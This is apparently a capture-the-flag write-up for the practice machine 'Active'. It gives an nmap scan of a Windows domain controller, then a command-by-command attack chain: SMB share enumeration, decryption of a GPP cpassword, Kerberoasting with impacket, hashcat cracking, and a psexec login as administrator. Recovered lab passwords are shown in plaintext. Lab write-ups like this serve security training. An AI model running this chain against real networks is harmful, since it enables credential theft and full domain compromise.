### Port scan
```text
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2022-10-02 10:16:17Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5722/tcp  open  msrpc         syn-ack Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         syn-ack Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack Microsoft Windows RPC
49169/tcp open  msrpc         syn-ack Microsoft Windows RPC
49171/tcp open  msrpc         syn-ack Microsoft Windows RPC
49182/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

### Exploit
```bash、
# get avaliable shares
smbmap -H $IP            

Disk             Permissions     Comment
----             -----------     -------
ADMIN$           NO ACCESS       Remote Admin
C$               NO ACCESS       Default share
IPC$             NO ACCESS       Remote IPC
NETLOGON         NO ACCESS       Logon server share 
Replication      READ ONLY
SYSVOL           NO ACCESS       Logon server share 
Users            NO ACCES

# domain name
active.htb

# login share
smbclient //$IP/Replication

# found \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
<?xml version="1.0" encoding="utf-8"?>
	<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
		<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
			<Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
		</User>
	</Groups>

# crack cPassword (https://github.com/t0thkr1s/gpp-decrypt)
python3 gpp-decrypt/gpp-decrypt.py -f Groups.xml

[ * ] Username: active.htb\SVC_TGS
[ * ] Password: GPPstillStandingStrong2k18

# proof cred (SVC_TGS:GPPstillStandingStrong2k18)
crackmapexec smb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares $IP

# get hashed SPN
impacket-GetUserSPNs -request -dc-ip $IP active.htb/SVC_TGS:GPPstillStandingStrong2k18

# crack hash (administrator:Ticketmaster1968)
hashcat -m 13100 -a 0 --force hash.txt /usr/share/wordlists/rockyou.txt --show

# access machine
impacket-psexec active.htb/administrator:Ticketmaster1968@$IP

```
